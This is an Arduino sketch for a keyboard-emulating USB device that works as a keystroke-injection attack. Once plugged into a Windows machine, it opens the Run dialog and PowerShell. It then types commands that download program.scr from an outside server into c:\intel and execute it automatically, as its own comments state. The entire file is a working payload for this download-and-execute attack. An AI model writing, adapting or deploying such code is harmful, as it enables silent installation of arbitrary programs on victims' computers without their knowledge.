#include <Keyboard.h>

void setup() {
  Keyboard.begin();
delay(750);
    
type(KEY_LEFT_GUI,false);
type('r',false);
Keyboard.releaseAll();
delay(750);

print(F("powershell"));//using powershell to make the operations
delay(500);
   
type(KEY_RETURN,false);
Keyboard.releaseAll();
delay(500);

print(F("\npowershell Import/Module BitsTransfer<"));
delay(100);
print(F("\nStart/BitsTransfer /Source http>&&jaymonsecurity.com&program.scr /Destination c>&intel&program.scr<"));//Download our program from the server and save it in c:/intel 
delay(100);
print(F("\nStart/Process c>&intel&program.scr<"));//autoexecute our program once has been downloaded
delay(100);
print(F("\nexit"));
delay(100);
    
type(KEY_RETURN,false);
Keyboard.releaseAll();
Keyboard.end();
}
void type(int key, boolean release) {
  Keyboard.press(key);
  if(release)
    Keyboard.release(key);
}
void print(const __FlashStringHelper *value) {
  Keyboard.print(value);
}
void loop(){}
